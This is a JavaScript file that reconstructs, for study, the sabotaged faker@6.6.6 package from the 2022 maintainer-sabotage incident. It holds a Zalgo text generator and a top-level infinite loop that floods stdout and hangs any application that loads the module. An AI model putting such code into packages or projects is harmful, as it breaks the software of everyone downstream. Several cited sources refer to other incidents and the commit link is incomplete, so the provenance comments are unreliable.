// faker@6.6.6 — reconstructed from public security analyses
// Source: https://github.com/nickcash/event-stream-malicious-code
// Source: https://www.lunasec.io/docs/blog/node-ipc-protestware/
// Commit: https://github.com/Marak/faker.js/commit/
//
// Maintainer sabotage (Marak Squires, January 2022).
// Published version 6.6.6 with infinite loop printing
// "endMau5 ... " message followed by ZALGO text to stdout.
// Combined with colors.js sabotage on same day.
//
// Technique: Infinite loop (while(true)) printing text to crash
// dependent applications via stdout flooding.

// Zalgo text generation (reconstructed from source)
function generateZalgo(text) {
  var zalgo_up = ['\u030d', '\u030e', '\u0304', '\u0305', '\u033f',
    '\u0311', '\u0306', '\u0310', '\u0352', '\u0357',
    '\u0351', '\u0307', '\u0308', '\u030a', '\u0342'];
  var zalgo_down = ['\u0316', '\u0317', '\u0318', '\u0319', '\u031c',
    '\u031d', '\u031e', '\u031f', '\u0320', '\u0324',
    '\u0325', '\u0326', '\u0329', '\u032a', '\u032b'];
  var result = '';
  for (var i = 0; i < text.length; i++) {
    result += text[i];
    for (var j = 0; j < 10; j++) {
      result += zalgo_up[Math.floor(Math.random() * zalgo_up.length)];
      result += zalgo_down[Math.floor(Math.random() * zalgo_down.length)];
    }
  }
  return result;
}

// Infinite loop — DoS on any application that requires faker
console.log('endMau5');
console.log('aaaaa]a]aa');

for (var i = 666; i < Infinity; i++) {
  var text = generateZalgo('faker');
  console.log(text);
}
